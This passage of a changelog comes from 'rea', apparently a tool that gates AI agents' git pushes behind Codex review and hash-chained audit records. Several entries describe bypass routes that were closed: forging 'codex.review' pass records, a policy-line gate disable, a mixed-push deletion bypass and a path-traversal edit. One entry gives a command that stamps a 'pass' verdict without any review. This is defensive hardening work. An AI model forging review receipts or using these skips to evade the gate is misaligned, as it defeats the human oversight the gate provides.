  as legacy and refreshes 0.11.x installs in place.

  B. **`REA_SKIP_CODEX_REVIEW=<reason>` is now a real audit-logged skip
  env var.** Pre-0.12.0 only `REA_SKIP_PUSH_GATE` worked at the push-gate
  tier; `REA_SKIP_CODEX_REVIEW` was honored at the gateway-tier reviewers
  but silently ignored on `git push`. Both env vars are now equivalent at
  the gate. Audit metadata records `skip_var: REA_SKIP_PUSH_GATE` vs
  `REA_SKIP_CODEX_REVIEW` so operators can grep their audit log for the
  variant. When both are set, `REA_SKIP_PUSH_GATE` wins.

  C. **`rea doctor` fails when `policy.review.codex_required: true` and
  the `codex` binary is not on PATH.** The codex CLI was a hard prereq
  but the install path never surfaced it — fresh contributors learned at
  first push. A new `codex CLI on PATH` check fails fast with an
  actionable detail (install hint + `codex_required: false` opt-out).
  The probe walks `process.env.PATH` directly (with `PATHEXT` on
  Windows) rather than shelling out to a helper, so it works in
  sanitized POSIX environments where `/bin` is omitted from PATH.
  Skipped when codex is not required.

  D. **`--last-n-commits N` flag and `policy.review.last_n_commits` key.**
  On feature branches with many commits relative to base, the full
  `origin/main` diff was too large for codex to review deterministically
  (the helixir branch was 50+ commits ahead and saw codex flip verdicts
  across rounds). The new option resolves the diff base to `HEAD~N` via
  `git rev-parse`. Precedence: `--base <ref>` > `--last-n-commits N` >
  `policy.review.last_n_commits` > refspec-aware base resolution >
  upstream ladder. When `HEAD~N` is unreachable the resolver clamps
  based on whether the repo is a shallow clone: on a FULL clone with a
  branch shorter than N, clamps to the empty-tree sentinel so the root
  commit is included (reviewing all K+1 commits); on a SHALLOW clone,
  clamps to the deepest locally resolvable ancestor SHA so the review
  does not balloon to every tracked file (older history exists on the
  remote but isn't fetched). A stderr warning surfaces requested-vs-
  clamped numbers in both cases. Audit metadata records
  `base_source: 'last-n-commits'`, `last_n_commits: <count actually
reviewed>`, and `last_n_commits_requested: N` (only present when
  clamped).

  E. **Default `review.timeout_ms` raised from 600000 (10 min) to
  1800000 (30 min).** 10 minutes was too tight for realistic
  feature-branch reviews and was the most-commonly-cited cause of
  recurring timeout exits during the helixir session. Operators with
  explicit `timeout_ms:` pinned in their `.rea/policy.yaml` are unaffected;
  new installs and unset-key consumers get the more forgiving default.

  No schema breaking changes. No public-API breaking changes. Existing
  0.11.x installs upgrade cleanly via `rea upgrade` (which refreshes the
  husky/fallback hook bodies via the v2-legacy marker path).

## 0.11.0

### Minor Changes

- a6faf92: 0.11.0 — replace cache-attestation push gate with a stateless Codex gate

  The push-review gate that shipped through 0.10.x asked "has a qualifying
  Codex receipt been recorded for this HEAD SHA?" and consulted
  `.rea/review-cache.jsonl` + hash-chained audit records. That model required
  agents to fabricate attestations (`rea cache set`, `rea audit record
codex-review --also-set-cache`) on every push, produced a 1,250-line bash
  core plus a TypeScript port in flight, and was the root cause of defects
  D/E/O/P and Helix bug 1.

  This release replaces the entire stack with a stateless gate:

                                  git push
                                    → .husky/pre-push → rea hook push-gate
                                    → codex exec review --base <ref> --json
                                    → parse verdict from streamed findings
                                    → block on [P1] (blocking) or [P2] when concerns_blocks=true
                                    → write .rea/last-review.json + audit record
                                    → exit 0 / 1 (HALT) / 2 (blocked)

  Codex is run fresh on every push. No cache. No SHA matching. No receipt
  consultation. When the gate blocks, Claude reads stderr + the
  machine-readable `.rea/last-review.json`, fixes, and retries — the auto-fix
  loop IS the retry mechanism.

  ### BREAKING CHANGES
  - **`rea cache` subcommand tree removed** (`check`, `set`, `clear`,
    `list`). The stateless gate needs no cache. Operators who previously
    scripted `rea cache set` for manual unblocks can delete those calls.
  - **`rea audit record codex-review` removed.** The gate no longer
    consults audit records to decide pass/fail.
  - **`policy.review.cache_max_age_seconds` removed.** `rea upgrade`
    strips it from `.rea/policy.yaml` with a timestamped `.bak-<ts>`
    backup.
  - **`policy.review.allow_skip_in_ci` removed.** Same migration path. The
    gate now runs identically in CI, dev, and hook contexts — no CI
    special case.
  - **`REA_SKIP_CODEX_REVIEW`, `REA_SKIP_PUSH_REVIEW` env vars no longer
    consulted.** Replaced by `REA_SKIP_PUSH_GATE=<reason>` (value-carrying,
    audited, HALT still wins) and `REA_ALLOW_CONCERNS=1` (per-push override
    of the concerns-block default).
  - **Hook files deleted**: `hooks/push-review-gate.sh`,
    `hooks/push-review-gate-git.sh`, `hooks/commit-review-gate.sh`,
    `hooks/_lib/push-review-core.sh`. The husky `.husky/pre-push` now
    executes `rea hook push-gate` inline. `rea upgrade` migrates installed
    hooks (deletes the four dead files, refreshes the husky stub).
  - **Audit `tool_name: codex.review*` and `push.review.skipped` no longer
    emitted by the gate.** The new events are `rea.push_gate.reviewed`,
    `rea.push_gate.halted`, `rea.push_gate.disabled`,
    `rea.push_gate.skipped`, `rea.push_gate.empty_diff`,
    `rea.push_gate.error`. The manual `/codex-review` slash command still
    emits `codex.review` audit records.

  ### New
  - **`rea hook push-gate [--base <ref>]`** — the single CLI entry point
    husky calls. Resolves base ref via upstream → origin/HEAD → main/master
    → empty-tree, runs `codex exec review --json` against the diff, and
    maps the streamed P1/P2/P3 severity markers to a blocking/concerns/pass
    verdict.
  - **`policy.review.concerns_blocks: boolean`** (default `true`) — when
    `true`, P2 findings block the push (override per-push with
    `REA_ALLOW_CONCERNS=1`).
  - **`policy.review.timeout_ms: number`** (default 600_000) — hard cap on
    the `codex exec review` subprocess. Timeouts exit 2 with a clear error.
  - **`.rea/last-review.json`** — atomic-write structured dump of the
    latest Codex run. Gitignored. Findings pass through the rea redact
    pattern set before hitting disk (no secret quoting from the diff
    leaks).

  ### Migration

  `rea upgrade` handles the transition:
  1. Writes `.rea/policy.yaml.bak-<ts>`.
  2. Strips `cache_max_age_seconds` + `allow_skip_in_ci` from the
     `review:` block; adds `concerns_blocks: true` if absent.
  3. Refreshes `.husky/pre-push` and `.git/hooks/pre-push` to the new
     stub body (both delegate to `rea hook push-gate`).
  4. Deletes the four removed hook files from `.claude/hooks/`.

  Codex CLI must be on `PATH`. When absent, the gate fails with a clear
  error pointing at `npm i -g @openai/codex` (or set
  `review.codex_required: false` to disable).

## 0.10.3

### Patch Changes

- 7cbcb93: chore(hooks): review-gate Phase 2a — supporting TS modules (G)

  Add `base-resolve.ts`, `diff.ts`, `audit.ts`, `cache.ts` under
  `src/hooks/review-gate/`. These compose with the Phase 1 primitives
  (shipped in 0.10.2) to build the runPushReviewGate / runCommitReviewGate
  surface in Phase 2b. No behavioral change in this release: the bash
  core at `hooks/_lib/push-review-core.sh` continues to run in production;
  the new modules are library-level supporting code that Phase 2b wires
  into a composition layer.

  New modules:
  - `diff.ts` — git-subprocess wrappers (rev-parse, merge-base, diff,
    rev-list, cat-file, config, symbolic-ref, common-dir) through a
    mockable `GitRunner` port. Args always passed as an array so refspec
    names containing shell metacharacters are inert.
  - `base-resolve.ts` — four-path base-ref resolution: tracked-branch,
    new-branch-with-`branch.<src>.base`-config, new-branch-origin/HEAD,
    bootstrap-empty-tree. Preserves defect N's label-promotion semantic
    (Target: label echoes the resolved anchor only when operator-configured
    base fires). State-isolation across multi-refspec pushes unit-proven.
  - `audit.ts` — emitPushReviewSkipped / emitCodexReviewSkipped over the
    existing appendAuditRecord helper; hasValidCodexReview implements
    defect P (emission_source predicate) and defect U (per-line parse
    tolerance) natively. The bash `jq -R 'fromjson?'` scan is obviated.
  - `cache.ts` — wraps `review-cache.ts` lookup + discriminated outcome
    (`hit_pass` / `hit_fail` / `miss` / `query_error`). Re-exports Phase
    1's `computeCacheKey` as a single module-wide entry point.

  Cache-key contract (design §8): `cache.ts::computeCacheKey` is a strict
  re-export of `cache-key.ts::computeCacheKey`. The fixture suite in
  `cache.test.ts` proves byte-exact parity against
  `__fixtures__/cache-keys.json` for all six scenarios captured from the
  0.10.1 bash core — if the two modules ever drift, every consumer's
  on-disk cache is broken and the PR is rejected.

  104 new unit tests. Coverage: `base-resolve.ts` 100%, `diff.ts` 100%,
  `audit.ts` 97.87%, `cache.ts` 95.45% — all above the Phase 2a ≥90%
  target.

## 0.10.2

### Patch Changes

- 1ff7aad: G Phase 1 — TypeScript port of push-review-core.sh / commit-review-gate.sh, pure
  primitives.

  Adds `src/hooks/review-gate/` with the unit-testable halves of the review-gate
  contract: refspec parsing (`args`), SHA-256 hashing (`hash`), banner composition
  (`banner`), OS identity capture (`metadata`), policy resolution (`policy`),
  protected-path detection (`protected-paths`), typed error set (`errors`), and
  the cache-key contract (`cache-key`). The bash core at
  `hooks/_lib/push-review-core.sh` continues to run in production — Phase 1 is
  internal refactor only.

  Closes the open questions from the 0.11.0 design doc with ship-fast defaults:
  - Phase 4 will clean-remove the shared-core shim (no forward-compat stub).
  - Commit-gate co-port is in scope for G; the shared module tree serves both.
  - Phase 4 also lands the T self-check widen to audit-middleware + rotator.
  - `src/hooks/review-gate/__fixtures__/cache-keys.json` records the 0.10.1
    cache-key expectations across six scenarios (bare push, multi-refspec,
    force-push, deletion, new-branch, cross-repo, unicode-filename); every
    phase runs a byte-exact compat assertion against this fixture.

  Coverage on the new module: 96.7% lines / 93.02% branches / 100% functions
  across 142 unit tests.

## 0.10.1

### Patch Changes

- 933fc79: Governance recovery + audit integrity + base-branch resolution + audit-chain corruption-tolerance (Defects S + P + N + T + U)

  This patch ships five fixes on one branch. All five are independent but
  ship together because the push-gate and audit-helper surfaces they touch
  overlap enough that landing T and U as a follow-up patch would have required
  a second Codex pass over code already under review. Note: the branch commit
  title on `main` reads "(0.10.2)" as a planning artifact from the working tree
  — the shipped npm version is `0.10.1`.

  ## Defect S — TOFU drift recovery CLI (HIGH — governance recovery path)

  Before this patch, the only documented recovery path for a TOFU drift fail-close
  was `REA_ACCEPT_DRIFT=<name> rea serve` — a startup env var. When the gateway is
  spawned indirectly (Claude Code via `.mcp.json`, a systemd unit, any wrapper that
  owns the spawn), the operator has no env-injection surface. A legitimate
  registry edit therefore silently removed the drifted server from
  `__rea__health.downstreams` and `tools/list`, with the only manual workaround
  being to hand-edit `.rea/fingerprints.json`.

  New CLI surface:
  - **`rea tofu list [--json]`** — prints every server declared in
    `.rea/registry.yaml` with its current-vs-stored fingerprint verdict
    (`first-seen` | `unchanged` | `drifted`) and short fingerprints.
  - **`rea tofu accept <name> [--reason <text>]`** — recomputes the current
    canonical fingerprint for `<name>` and writes it to `.rea/fingerprints.json`.
    Emits a `tofu.drift_accepted_by_cli` (or `tofu.first_seen_accepted_by_cli`)
    audit record with BOTH the stored and current fingerprints plus the optional
    reason, so the accept decision is on the hash chain.

  The drift banner printed by `src/registry/tofu-gate.ts` now names the new CLI
  path first and demotes `REA_ACCEPT_DRIFT` to a one-shot bypass. `rea doctor`'s
  drift warning replaces the env-var pointer with `rea tofu list` /
  `rea tofu accept <name>`.

  ## Defect P — `codex.review` audit record forgery surface (CRITICAL — integrity)

  Before this patch, any caller with filesystem access to `node_modules` could
  write a valid, hash-chained `codex.review` entry claiming any `reviewer` and any
  `verdict` for any `head_sha` by importing `node_modules/@bookedsolid/rea/dist/audit/append.js`
  and calling `appendAuditRecord()` directly with `tool_name: 'codex.review'`.
  Downstream auditors — and the push-review cache gate — could not distinguish
  "real Codex CLI ran and passed" from "agent wrote an emit-audit script claiming
  Codex passed." The governance promise of `codex.review` was a convention, not an
  enforced contract.

  New mechanism: `AuditRecord` gains a required `emission_source` field
  (`"rea-cli"` | `"codex-cli"` | `"other"`) that is part of the hashed record
  body.
  - The public `appendAuditRecord()` helper stamps every record with
    `emission_source: "other"`. The field is NOT part of the public
    `AppendAuditInput` shape — external consumers cannot self-assert `"rea-cli"`.
  - New `appendCodexReviewAuditRecord()` helper is the ONLY write path that stamps
    `"rea-cli"` for `codex.review` records. `tool_name` and `server_name` are
    fixed inside the helper and excluded from the input type, so callers cannot
    route a generic record through the codex-certification path. Exclusively
    reachable through the `rea audit record codex-review` CLI (classified as a
    Write-tier Bash invocation by `reaCommandTier`, defect E).
  - The push-review cache gate's jq predicate now requires
    `.emission_source == "rea-cli" or .emission_source == "codex-cli"` for
    `codex.review` lookups. Records emitted through the generic helper (tagged
    `"other"`) or legacy pre-0.10.1 records (field missing) are rejected.

  **Upgrade effect:** The first push on each branch after upgrading to 0.10.1 will
  require a fresh `rea audit record codex-review` invocation, because legacy
  `codex.review` audit records predate `emission_source`. Subsequent pushes hit
  the cache as normal.

  **CI impact:** Non-interactive pipelines that invoke the pre-push gate
  (e.g. `rea push`, husky pre-push in CI runners) will see one failed push per
  branch after upgrade. Bridge with `REA_SKIP_CODEX_REVIEW=<reason>` as the narrow
  one-push waiver, or pre-stamp the branch tip with
  `rea audit record codex-review --head-sha <sha> --branch <b> --target <t>
--verdict pass --finding-count 0 --also-set-cache` before upgrading. Consumers
  who proxied Codex through a gateway-registered MCP and relied on middleware-
  written records to satisfy the gate should note that those legacy records also
  predate `emission_source` and are rejected until re-emitted.

  Regression tests at `src/audit/emission-source.test.ts`: public helper stamps
  `"other"` even for `tool_name: "codex.review"`, dedicated helper stamps
  `"rea-cli"` and forces canonical tool/server names, `emission_source` is part of
  the computed hash (flipping the field breaks the chain).

  ## Defect N — base-branch resolution consults `branch.<name>.base` (MEDIUM, partial)

  Before this patch, `hooks/_lib/push-review-core.sh`'s new-branch base resolution
  fell through to `origin/HEAD` when the local branch had no upstream set yet,
  without consulting operator-configured per-branch base tracking. A feature
  branch targeting `dev` in a main-as-production repo was therefore reviewed
  against `origin/main` silently, producing a diff that spanned every commit
  between `main` and the feature — often thousands of lines for a handful of real
  changes.

  This patch adds a per-branch git-config consultation:
  `git config branch.<source>.base <ref>` is now read BEFORE the `origin/HEAD`
  fallback. When set, the gate diffs against the configured ref (preferring the
  remote-tracking form for server-authoritative anchoring) and echoes it as the
  `Target:` label. Without a config entry, behavior is unchanged. `configured_base`
  is reset to empty at the top of every refspec-loop iteration so multi-refspec
  pushes (e.g. `git push --all`) cannot leak state from an earlier iteration's
  config lookup (Codex pass finding #1).

  **Scope note:** This is the opt-in half of N. The fail-loud-when-no-base and
  general-label-fix halves remain deferred to defect G's TypeScript port of
  `push-review-core.sh`, where the merge-base-anchor / refspec-target separation
  can be properly expressed without breaking the existing cache-key contract (an
  inline bash attempt was reverted during this patch after it silently invalidated
  consumer cache entries for bare pushes).

  ## Defect T — audit writer serialization self-check (MEDIUM — integrity)

  Before this patch, `appendAuditRecord()` called
  `fs.appendFile(auditFile, JSON.stringify(record) + '\n')` unconditionally. If a
  future regression introduced a non-JSON-safe field into `AuditRecord` (BigInt,
  circular reference, undefined in array position, hostile `metadata` value that
  survives TypeScript typing but breaks JSON round-trip), the writer would
  produce an unparseable line on disk and only surface the failure at
  `rea audit verify` time — or, worse, when push-review-core.sh's jq scan
  silently failed to find a legitimate `codex.review` record past the corruption
  (which is precisely defect U).

  This patch adds a pre-append `JSON.parse` self-check. The helper now verifies
  the serialized line round-trips before it touches `.rea/audit.jsonl`; a throw
  aborts the append without writing and the on-disk chain tail is unchanged.
  The diagnostic names the offending `tool_name`/`server_name` so the caller can
  localize the regression. This is defense-in-depth against a class of bug that
  would otherwise corrupt the hash chain at write time.

  The self-check is scoped to the public `appendAuditRecord()` /
  `appendCodexReviewAuditRecord()` entry points (both flow through
  `doAppend()`). The gateway middleware write at
  `src/gateway/middleware/audit.ts` and rotation-marker emission at
  `src/gateway/audit/rotator.ts` still use raw `JSON.stringify()` +
  `appendFile()` / `writeFile()` without a self-check. Widening T to cover
  those paths requires a shared serialization helper and is tracked as a
  followup — this patch closes the two entry points that every external
  consumer (Helix, Codex CLI, ad-hoc CLI scripts) actually reaches.

  Separately, `rea audit verify` now collects every unparseable line across
  every file in the walk instead of aborting at the first one. Each failure is
  reported as `audit.jsonl:LINE[:COL]  <parser message>`, and chain verification
  continues over the parseable subset — a genuine hash tamper on a surviving
  record still surfaces alongside the parse failures. The exit code is 1 if
  there is any parse failure OR any chain failure; a fully clean file still
  reports "Audit chain verified". Empty lines mid-file are a distinct parse
  failure class (not silently skipped). Operators bisecting a corrupt audit
  file now see every affected line number in one pass.

  Tamper diagnostics include BOTH the parseable-subset record index (for
  audit-tooling consumers that walk `records[]`) AND the 1-based original-file
  line number (for operator workflows that `sed -n Np` or editor:LINE into the
  offending record). The two diverge whenever a malformed line precedes the
  tamper — the file line is the authoritative jump target.

  Regression tests at `src/audit/append.test.ts` (self-check intercept) and
  `__tests__/cli/audit-verify-mixed-malformed.test.ts` (five scenarios covering
  mixed-corruption, tamper-alongside-parse-failure, tamper-AFTER-malformed-line
  with divergent subset/file indices, clean-file success, and mid-file empty
  lines).

  ## Defect U — push-review-core.sh audit scan tolerates malformed lines (HIGH — availability)

  Before this patch, `hooks/_lib/push-review-core.sh` used
  `jq -e --arg sha "$sha" '<predicate>' "$_audit"` to test whether a
  `codex.review` receipt existed for the push's head SHA. jq interprets the
  file as a single JSON stream; a single malformed line anywhere in
  `.rea/audit.jsonl` (one stray backslash-u-non-hex sequence, one truncated
  write) makes jq exit with status 2 BEFORE the `select` ever runs against any
  record. Every legitimate codex.review receipt past the corruption becomes
  unreachable. The failure is total: every subsequent push that requires a
  cache hit is silently blocked until the corrupt line is hand-edited out of
  the audit file. One stray byte locks the gate closed.

  This patch rewrites the scan as
  `jq -R --arg sha "$sha" 'fromjson? | select(<predicate>)' "$_audit" 2>/dev/null | grep -q .`.
  `-R` takes each line as a raw string; `fromjson?` is the error-suppressing
  parser — malformed lines yield empty output instead of failing the pipeline.
  The `select` filter runs against every successfully parsed record. The
  predicate (tool_name, head_sha, verdict, emission_source) is unchanged, so
  defect P's forgery-rejection guarantee still holds line-by-line.

  Mirrored in both `hooks/_lib/push-review-core.sh` (upstream source) and
  `.claude/hooks/_lib/push-review-core.sh` (this repo's dogfood install). The
  two other jq scans in the file — `cache_result` inspection at approximately
  lines 432 and 612, and the cache hit/pass predicate at approximately line
  1107 — operate on single-value `printf`'d JSON strings, not on audit.jsonl,
  and are left as `jq -e`.

  Regression test at `__tests__/hooks/push-review-fromjson-tolerance.test.ts`
  drives the exact new pipeline against a scratch audit.jsonl with a malformed
  line sandwiched between two valid `codex.review` records with distinct
  head_sha values. Both records are findable. The forgery-rejection case
  (a hand-written line with `emission_source: "other"` on the far side of a
  malformed line) is also covered — tolerance for malformed lines must not
  weaken the predicate into "anything passes".

  ## Followups (not in this patch)
  - **G** (push-review-core.sh TS port) — 1154 LOC of shell + jq + awk with 10
    integration test suites that shell out in real git subprocesses. Requires a
    clean-room TS implementation with ≥90% unit coverage and a thin bash shim.
    Tracked separately for 0.11.0.
  - **Widen T to gateway middleware + rotation markers** — both paths
    (`src/gateway/middleware/audit.ts` line ~148 and `src/gateway/audit/rotator.ts`
    line ~253) still write raw `JSON.stringify(record)+'\n'` without the
    self-check. No known exploit today (TypeScript input types rule out non-JSON
    field shapes, and proxied MCP metadata is already redacted), but a shared
    serialization helper would make the T guarantee universal. Tracked for a
    future pass.
  - Shell-level integration test for defect P's gate predicate (forged record
    with `emission_source: "other"` fails the cache gate). The existing test
    suite passes end-to-end post-patch; a dedicated P integration fixture can be
    added as part of the G rewrite.
  - Codex pass finding #2: proxied-MCP records through the gateway middleware
    stamp `"rea-cli"` (technically correct — rea is the writer), which means an
    MCP server named `codex` exposing a tool named `review` could produce
    gate-satisfying records via the middleware path if a future middleware also
    populated `metadata.head_sha`/`metadata.verdict`. Today no such middleware
    exists and `ctx.metadata` is `{}` by default, so the residual surface is
    narrow. Track for a future pass: either add a distinct `"rea-gateway"`
    discriminator, or narrow the jq predicate to require a CLI-only metadata
    shape.
  - Codex pass finding #3: `rea tofu accept` writes the fingerprint before
    appending the audit record. If audit append fails, the on-disk fingerprint
    is updated but unaudited, and a re-run short-circuits on the `stored ===
current` guard. Track for a future pass — reverse the order (audit first,
    then fingerprint) or explicitly document the recovery procedure in the
    error message.

## 0.10.0

### Minor Changes

- c5ec101: Agent push-workflow unblock — self-consistent gate, public CLI, anchored path matcher, session hook-patching (Defects D + E + F + H + I)
  - **D (rea#77): `rea audit record codex-review` public CLI.** New subcommand
    `rea audit record codex-review --head-sha <sha> --branch <b> --target <t>
--verdict pass|concerns|blocking|error --finding-count <N> [--summary ...]
[--session-id ...] [--also-set-cache]`. Thin wrapper around the public
    `appendAuditRecord()` helper with the canonical `tool_name: "codex.review"`
    and `server_name: "codex"` baked in. `--also-set-cache` updates
    `.rea/review-cache.jsonl` in the same invocation (sequential writes,
    not 2PC — but close enough that push-gate lookups cannot observe the
    audit-without-cache state except across a crash) via the
    Codex-verdict mapping (`pass|concerns →
pass`, `blocking|error → fail`). `rea cache set` now also accepts the four
    canonical Codex verdicts at the CLI boundary. Kills the two-step race
    where the audit record landed but the cache stayed cold.
  - **E (rea#78): REA's own CLI no longer denied by REA's own middleware.**
    Policy middleware now classifies `Bash` invocations whose command parses
    as `rea <sub>` by the subcommand's own tier (Read / Write / Destructive)
    instead of the generic Bash Write default. Result: an L1 agent can run
    `rea cache check`, `rea audit record codex-review`, and `rea cache set`
    — exactly the workflow the push-gate remediation text documents. Deny
    messages on `Bash` denials now include the command head (e.g.
    `Bash (rea freeze)` or `Bash ("npm install x...")`) and carry a
    `reason_code = 'tier_exceeds_autonomy'` metadata field.
  - **F: cache-query error surfaces distinctly from cache-miss.** The
    `2>/dev/null || echo '{"hit":false}'` pattern in the push and commit
    review gates swallowed stderr AND the exit code, hiding broken `rea`
    installs for weeks (Defect A's node-on-shim bug was one). The gates now
    split stdout/stderr capture and emit a `CACHE CHECK FAILED (exit=N):
<stderr>` banner on stderr when the CLI exits non-zero, while still
    falling through to `{hit:false}` so pushes are not wedged. Mirrored in
    `.claude/hooks/` and applied to both `push-review-core.sh` and
    `commit-review-gate.sh`.
  - **H (rea#79): dot-anchored blocked-path matcher.** The default
    always-blocked list includes `.rea/`. Before the fix, segment-suffix
    matching caused `.rea/` to block writes to any folder named `rea`
    (including Obsidian-style `Projects/rea/Bug Reports`). The matcher now
    requires leading-dot segment equality for dot-prefixed patterns.
    Non-dot patterns keep segment-suffix semantics so operators who want
    to block ANY `rea/` folder can still opt in by dropping the dot.
    Shell enforcer (`blocked-paths-enforcer.sh`) already used prefix
    matching and did not need the change.
  - **I: `REA_HOOK_PATCH_SESSION` env var for session-scoped hook patching.**
    Setting `REA_HOOK_PATCH_SESSION=<reason>` allows edits under the runtime
    hook directory `.claude/hooks/` for that shell session. Every allowed
    edit emits a `hooks.patch.session` audit record (routed through the REA
    hash-chained `appendAuditRecord`; if the chain cannot be extended the
    edit is refused) with operator-declared reason, file, pre-edit SHA,
    actor identity, pid, and ppid. Session boundary is the expiry — a new
    shell requires a fresh opt-in. `.rea/policy.yaml`, `.rea/HALT`, and
    settings JSONs remain blocked regardless. Paths containing `..`
    segments are rejected before any match runs, closing a traversal
    bypass (`.claude/hooks/../settings.json`) surfaced by an adversarial
    Codex pass pre-merge. The source-of-truth `hooks/` directory remains
    editable by default; operators who want to gate it can add it to
    `blocked_paths`. See new THREAT_MODEL §5.22.
  - **Docs:** new README "Agent push workflow" section with copy-paste CLI
    - SDK examples; new `AGENTS.md` at repo root as canonical agent
      onboarding; THREAT_MODEL §5.22 covering the hook-patch session trust
      boundary.

  No breaking changes. `rea cache set <sha> pass|fail` still works; the four
  new Codex verdicts are additive. The `@bookedsolid/rea/audit` public export
  surface is unchanged — the CLI is a new thin wrapper, not a new SDK entry
  point.

  [security]

## 0.9.4

### Patch Changes

- 2cf00f1: [security] [portability] Close four hook defects surfaced by CodeRabbit review on HELiX PR #1506 (rea#61, #62, #63, #64):
  - **J (CRITICAL security bypass, rea#61)** — mixed-push deletion guard in `push-review-core.sh` was nested inside the `[[ -z SOURCE_SHA || -z MERGE_BASE ]]` fallback. A mixed push such as `git push origin safe:safe :main` set `SOURCE_SHA` from the safe refspec and set only `HAS_DELETE=1` from the delete refspec — the nested deletion block never evaluated and the deletion passed the gate unchecked. The `HAS_DELETE` check is now hoisted above the fallback so any deletion in any refspec blocks the entire push.
  - **K (MEDIUM user-facing render, rea#62)** — `LINE_COUNT` and `FILE_COUNT` in the `PUSH REVIEW GATE` banner used `grep -c ... 2>/dev/null || echo "0"`. When grep exited non-zero on a no-match it still printed its own `0` to stdout, and the `|| echo "0"` branch appended another, yielding `0\n0` interpolated into the banner. Replaced with `|| true` + `${VAR:-0}` default.
  - **L (HIGH silent cache disarm, rea#63)** — `PUSH_SHA` was computed via `shasum -a 256 | cut -d' ' -f1 2>/dev/null || echo ""`. On Alpine, distroless, and most minimal Linux CI images `shasum` is not installed (only `sha256sum` is), so the pipeline failed and `|| echo ""` produced an empty `PUSH_SHA`. Combined with the silent cache-miss fallback (separate Defect F, scheduled 0.10.0), every push from such runners burned a full fresh codex review invisibly. Replaced with a portable `sha256sum → shasum → openssl` chain, hex-64 validation, and a visible WARN when no hasher is found. The openssl branch uses `awk '{print $NF}'` without `-r` to stay compatible with OpenSSL 1.1.x (Debian 11, Ubuntu 20.04, RHEL 8, Amazon Linux 2).
  - **M (MEDIUM schema drift, rea#64)** — `SKIP_METADATA` used `jq --arg os_pid` / `--arg os_ppid`, which always produces string-typed fields. Downstream auditors querying `.metadata.os_identity.pid == 1234` (numeric) silently got zero matches. Switched to `--argjson` for `os_pid` / `os_ppid` (both come from bash internals `$$` / `$PPID`, guaranteed non-empty numeric). `os_uid` stays on `--arg` because `id -u 2>/dev/null || echo ""` can legitimately return empty.

  Regression coverage: new `__tests__/hooks/push-review-gate-portability-security.test.ts` exercises all four defects (9 cases). Existing `push-review-gate-skip-push-review.test.ts` assertions for pid/ppid type flipped from `string` to `number` per M.

## 0.9.3

### Patch Changes

- c3817e3: [security] Close two push/commit-gate bypasses.

  **Defect B** — Remove `push_review: false` / `commit_review: false` grep
  short-circuits from `hooks/_lib/push-review-core.sh` (section 5) and
  `hooks/commit-review-gate.sh` (section 5). A single line in `.rea/policy.yaml`
  could silently disable the entire push or commit gate with no audit trail.
  The only supported whole-gate escape hatch for the push path is now the
  env-var opt-in `REA_SKIP_PUSH_REVIEW=<reason>`, which requires an explicit
  reason, a git identity, and writes a `push.review.skipped` audit record.

  Pre-existing carve-outs that remain intentional, documented, and audited
  where applicable (not closed by this hotfix): (1) `review.codex_required:
false` in policy disables only the protected-path Codex branch — a
  per-profile no-Codex mode, covered by
  `__tests__/hooks/push-review-gate-no-codex.test.ts`; (2) the env-var
  waiver `REA_SKIP_CODEX_REVIEW=<reason>` short-circuits only the Codex
  protected-path branch and writes an audited `codex.review.skipped` record
  (see `hooks/_lib/push-review-core.sh` section 5c and #85); (3) `git commit
--amend` short-circuits the commit-review gate because amendment review is
  out of scope for this iteration of the hook.

  **Defect C** — Extend the protected-paths matcher in
  `hooks/_lib/push-review-core.sh` to include `.rea/` and `.husky/`. Diffs
  touching these trees now require a `/codex-review` audit entry before push,
  matching the five pre-existing protected roots (`src/gateway/middleware/`,
  `hooks/`, `.claude/hooks/`, `src/policy/`, `.github/workflows/`). The
  error-message listing is updated in lockstep. The awk regex uses the
  bracket-literal `[.]rea/` and `[.]husky/` forms so bare project folders
  named `rea/` (e.g. `Projects/rea/Bug Reports/`) do not spuriously trigger
  the gate.

  New test suite `__tests__/hooks/push-review-gate-policy-bypass.test.ts`
  covers: `push_review: false` no longer bypasses, `commit_review: false` no
  longer bypasses, `.rea/` diff triggers Codex, `.husky/` diff triggers Codex,
  `Projects/rea/` (no leading dot, nested) does not fire, and top-level
  `rea/` (no leading dot, root) does not fire — the last case pins the
  load-bearing `[.]` bracket literal against future regex drift. A parity
  assertion block also pins byte-identity between `hooks/commit-review-gate.sh`
  and its `.claude/hooks/` dogfood mirror (the push-core mirror parity is
  already asserted in the adapter suite).

  Also extends `scripts/tarball-smoke.sh`: the `[security]` changeset gate now
  recognizes `__tests__/hooks/(*security*|*bypass*|*sanitize*|*injection*).test.ts`
  and asserts the hook files those tests exercise ship in both the tarball and
  the post-`rea init` install surface. A `[security]` hook-test file that
  yields zero extractable hook refs fails the gate loudly (template-literal or
  helper-indirection shapes are rejected). Granularity is per-test-file, not
  per-`it()` block — mixing unrelated `it()` cases in one file dilutes the
  proof and PR review is the mitigation.

  Dogfood mirrors under `.claude/hooks/` synced. No runtime signature or
  public-API change.

## 0.9.2

### Patch Changes

- 758f978: fix(hooks): execute `node_modules/.bin/rea` directly instead of via `node`

  The push-review-gate and commit-review-gate hooks previously resolved the rea
  CLI with `node "${REA_ROOT}/node_modules/.bin/rea"`. That path is NOT a plain
  JavaScript file — pnpm writes a POSIX shell-script shim there, and npm writes
  a symlink whose target carries its own `#!/usr/bin/env node` shebang. Running
  `node` on the shim parsed shell syntax as JavaScript and threw `SyntaxError`.
  The caller's `|| echo '{"hit":false}'` fallback silently masked the error,
  turning every push-review cache lookup into a miss — so a previously-approved
  push always re-tripped the review-required gate and every push was blocked.

  Two changes to the CLI-resolution ladder in `hooks/_lib/push-review-core.sh`
  and `hooks/commit-review-gate.sh` (and their dogfood copies under
  `.claude/hooks/`):
  - `-f` → `-x`: require the shim to be executable before attempting to use it.
  - Drop the `node` prefix on the shim branch. The shim handles `exec node` itself.

  The dogfood fallback (`dist/cli/index.js`) keeps the `node` prefix because that
  entry point IS a real JavaScript module.

  Regression test added at `__tests__/hooks/push-review-gate-cli-invocation.test.ts`
  covering three cases: pnpm-style shim, dogfood fallback, and a non-executable
  shim that must fall through to the dist branch.

## 0.9.1

### Patch Changes

- a61371f: docs: cumulative 0.3.0 → 0.9.0 catchup

  Documentation-only release. The README, threat model, security policy,
  contributor guide, project instructions, and the 0.5.0 migration note
  had drifted behind the codebase across the 0.3.0 → 0.9.0 window. No
  runtime changes.
  - **README.md**: full refresh. Live badges (npm, CI, provenance).
    Version status updated to 0.9.x. `rea status` section now documents
    the per-downstream live block (`name`, `circuit_state`,
    `retry_at`, `connected`, `healthy`, `last_error`,
    `tools_count`, `open_transitions`, `session_blocker_emitted`) and
